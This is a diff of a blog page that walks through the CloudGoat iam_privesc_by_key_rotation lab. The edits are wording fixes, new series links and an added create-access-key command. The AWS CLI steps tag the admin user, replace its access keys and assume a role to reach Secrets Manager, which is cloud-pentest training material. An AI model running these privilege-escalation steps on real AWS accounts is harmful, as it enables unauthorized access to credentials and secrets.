@@ -253,6 +253,10 @@
                 
                         
                 
+                        
+                
+                        
+                
             
         
         
@@ -273,15 +277,15 @@
                         </li>
                         
                             <li class="bullet">
-                                <a href="/posts/cloud-security-2/">Hands on Cloud Pentesting: 2 - Cloudgoat iam_privesc_by_key_rotation</a>
+                                <a href="/posts/smileyctf-2025/">SmileyCTF 2025 - Sculpture Revenge, dry-ice-n-co</a>
                             </li>
                         
                             <li class="bullet">
-                                <a href="/posts/themission-nahamcon2025ctf/">The Mission - NahamCon 2025 CTF</a>
+                                <a href="/posts/cloud-security-5/">Hands on Cloud Pentesting: 5 - Cloudgoat lambda_privesc</a>
                             </li>
                         
                             <li class="bullet">
-                                <a href="/posts/cloud-security-1/">Hands on Cloud Pentesting: 1 - Cloudgoat sns_secrets</a>
+                                <a href="/posts/cloud-security-4/">Hands on Cloud Pentesting: 4 - Cloudgoat iam_privesc_by_rollback</a>
                             </li>
                         
                     
@@ -294,6 +298,10 @@
                 
             
                 
+                
+                        
+                
+                        
                 
                         
                 
@@ -454,7 +462,7 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cloudgoat create iam_privesc_by_key_rotation
 </span></span></code></pre></div><p>We start off with the provided AWS access key and secret key by configuring a new profile using AWS CLI.
 <img src="image-2.png" alt="configure creds">
-We are now a user called &ldquo;manager_cgidxwnp5b4tkv&rdquo;. Trying out the usual IAM enumeration commands, we can find our that we are allowed to perform various actions such as list user, roles, view policies etc. Lets check them out one by one. The first thing we can check is the list of users that are present since the scenario requires some privilege escalation.</p>
+We are now a user called &ldquo;manager_cgidxwnp5b4tkv&rdquo;. Trying out the usual IAM enumeration commands, we find that we are allowed to perform various actions such as list user, roles, view policies etc. Lets check them out one by one. The first thing we can check is the list of users that are present, since the scenario requires some privilege escalation.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws iam list-users --profile acc-manager
 </span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Users&#34;</span>: <span style="color:#f92672">[</span>
@@ -488,7 +496,7 @@ We are now a user called &ldquo;manager_cgidxwnp5b4tkv&rdquo;. Trying out the us
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
-</span></span></code></pre></div><p>Here we can see 3 IAM Users <code>manager_cgidxwnp5b4tkv</code>(which is our current user), <code>developer_cgidxwnp5b4tkv</code> and <code>admin_cgidxwnp5b4tkv</code>.</p>
+</span></span></code></pre></div><p>Here we can see 3 IAM Users - <code>manager_cgidxwnp5b4tkv</code>(which is our current user), <code>developer_cgidxwnp5b4tkv</code> and <code>admin_cgidxwnp5b4tkv</code>.</p>
 <p>Next lets check out the list of roles.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws iam list-roles --profile acc-manager
 </span></span><span style="display:flex;"><span>...
@@ -580,7 +588,7 @@ The attached user policy is <a href="https://docs.aws.amazon.com/aws-managed-pol
     <summary>understanding the aws iam policy</summary>
    <p>Most AWS testing requires the skill off reading and understanding AWS policies. <a href="https://web.archive.org/web/20250319150547/https://start.jcolemorrison.com/aws-iam-policies-in-a-nutshell/" target="_blank">this</a> is the blog that appears at the top of google(just below <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements.html" target="_blank">amazons own docs</a>) and it has helped me grasp a few concepts better and based on that I&rsquo;ll try to explan the above policy.</p>
 <p>The &ldquo;Who&rdquo; in this case, or rather the &ldquo;Principal&rdquo;, is not mentioned here since this is an inline policy that is only there for the user &ldquo;manager_cgidxwnp5b4tkv&rdquo; so the policy only applies to this user.</p>
-<p>&ldquo;What&rdquo; we can do, or the &ldquo;Action&rdquo;, is defined as 2 separate &ldquo;what&rsquo;s&rdquo;. The first set &ldquo;Allows&rdquo; us to <code>iam:DeactivateMFADevice</code>,<code>iam:GetMFADevice</code> etc on the Resource - all users and mfa devices, if the condition - <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html#condition-keys-resourcetag" target="_blank">resource has tag</a> = developer, is true. This means that we can do actions like <code>iam:CreateAccessKey</code> if the resource has the tag <code>developer</code> set. The second set &ldquo;Allows&rdquo; us to create and delete virtual mfa devices.</p>
+<p>&ldquo;What&rdquo; we can do, or the &ldquo;Action&rdquo;, is defined as 2 separate &ldquo;what&rsquo;s&rdquo;. The first set &ldquo;Allows&rdquo; us to <code>iam:DeactivateMFADevice</code>,<code>iam:GetMFADevice</code> etc on the Resource - all users and mfa devices, if the condition - <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html#condition-keys-resourcetag" target="_blank">resource has tag</a> - developer, is set to true. This means that we can do actions like <code>iam:CreateAccessKey</code> if the resource has the tag <code>developer=true</code> set. The second set &ldquo;Allows&rdquo; us to create and delete virtual mfa devices which will come in handy later on.</p>
 
 </details>
 
@@ -610,7 +618,7 @@ The <a href="https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
-</span></span></code></pre></div><p>This policy allows us to tag or untag any resource. Using this, we can tag any user with the <code>developer</code> tag and hence meet the above condition to CreateAccess Key. Now that we can escalate privileges to any user, lets check out what the <code>admin_cgidxwnp5b4tkv</code> user is allowed to do.
+</span></span></code></pre></div><p>This policy allows us to tag or untag any resource. Using this, we can tag any user with the <code>developer=true</code> tag and hence meet the above condition to CreateAccess Key. Now that we can escalate privileges to any user, lets check out what the <code>admin_cgidxwnp5b4tkv</code> user is allowed to do.
 <img src="image-5.png" alt="admin user inline policy">
 The admin user has another policy called <code>AssumeRoles</code>. Lets see what that does:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws iam get-user-policy --user-name admin_cgidxwnp5b4tkv --policy-name AssumeRoles --profile acc-manager
@@ -632,6 +640,8 @@ The admin user has another policy called <code>AssumeRoles</code>. Lets see what
 </span></span></code></pre></div><p>This shows that the admin user is allowed to Assume the role of <code>cg_secretsmanager_cgidxwnp5b4tkv</code> which is our target role. So lets proceed to privesc to the admin user.
 <img src="image-6.png" alt="tag admin user"></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws iam tag-user --user-name admin_cgidxwnp5b4tkv --tags Key<span style="color:#f92672">=</span>developer,Value<span style="color:#f92672">=</span>true --profile acc-manager
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>aws iam create-access-key --user-name admin_cgidxwnp5b4tkv --profile acc-manager
 </span></span></code></pre></div><p>First we tag the admin user with developer key and value set to true but then when we try to create access key it fails because there are already 2 access keys for the admin user. We can list the access keys and then delete one of them using the following commands:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws iam list-access-keys --user-name admin_cgidxwnp5b4tkv --profile acc-manager
 </span></span><span style="display:flex;"><span>aws iam delete-access-key --access-key-id &lt;access_key_id&gt; --user-name admin_cgidxwnp5b4tkv --profile acc-manager
@@ -681,6 +691,27 @@ Once we configure the new profile, we can now use the secrests manager to list a
         <ul class="series">
             
             
+            
+            <li>
+                June 13, 2025 -
+                
+                    <a href="/posts/cloud-security-5/">Hands on Cloud Pentesting: 5 - Cloudgoat lambda_privesc</a>
+                
+            </li>
+            
+            <li>
+                June 12, 2025 -
+                
+                    <a href="/posts/cloud-security-4/">Hands on Cloud Pentesting: 4 - Cloudgoat iam_privesc_by_rollback</a>
+                
+            </li>
+            
+            <li>
+                June 9, 2025 -
+                
+                    <a href="/posts/cloud-security-3/">Hands on Cloud Pentesting: 3 - flaws.cloud</a>
+                
+            </li>
             
             <li>
                 June 7, 2025 -
